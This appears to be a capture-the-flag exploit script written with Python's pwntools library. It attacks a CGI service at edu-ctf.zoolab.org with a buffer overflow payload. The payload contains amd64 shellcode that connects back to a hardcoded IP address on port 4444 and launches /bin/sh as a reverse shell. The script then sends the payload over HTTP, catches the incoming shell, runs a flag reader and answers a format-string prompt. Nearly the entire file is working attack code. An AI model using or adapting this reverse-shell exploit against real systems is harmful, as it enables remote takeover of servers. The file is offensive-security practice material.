from pwn import *

context.arch = "amd64"
data = "\x00"*224 +"\xf8" + flat(0x40148a,-0x9,[0]*3)+"\xeb\x16".ljust(0x10,"\x00")+p64(0x40147a)
data += asm("sub rsp,0x500")
ip = "140.113.167.185"
port = 4444

ip_addr = p16(2)+p16(port)[::-1]
for i in ip.split("."):
	ip_addr += p8(int(i))
ip_addr =  hex(u64(ip_addr))


data += asm("""
_start:
	mov rbx,{}
        push rbx
        push 42                                 
        push 16                            
        push 41                            
        push 1                             
        push 2                             

        pop rdi                                 
        pop rsi                                 
        xor rdx, rdx                            
        pop rax                                 
        syscall

        mov rdi, rax                            
        pop rdx                                 
        pop rax                                 
        mov rsi, rsp                            
        syscall
	mov rdi,0
	mov rsi,4
	mov rax,33
	syscall
	mov rdi,1
        mov rsi,5
        mov rax,33
	syscall
	mov rdi,3
        mov rsi,0
        mov rax,33
        syscall
        mov rdi,3
        mov rsi,1
        mov rax,33
        syscall
        xor rax, rax
        mov rdi, 0x68732f6e69622f2f
        xor rsi, rsi
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59
        syscall
""".format(ip_addr))
payload = ".".join(map(lambda x:str(ord(x)),data))
print payload
#print ('REQUEST_METHOD=GET QUERY_STRING="ip=' + payload + '" gdb ./ip.cgi')
r = remote("edu-ctf.zoolab.org", 10080)
l = listen(4444)
r.sendline("GET /ip?ip={} HTTP/1.1\r\nHost:localhost\r\n\r".format(payload))
x = l.wait_for_connection()
x.sendline("cd / && ./readflag")
x.sendlineafter("?","_%6$p\n\x00")
x.recvuntil("_")
val = int(x.recvline(),16)
x.sendlineafter(":",str(val))
x.interactive()
#r = process(["./ip.cgi"])
#r.interactive()
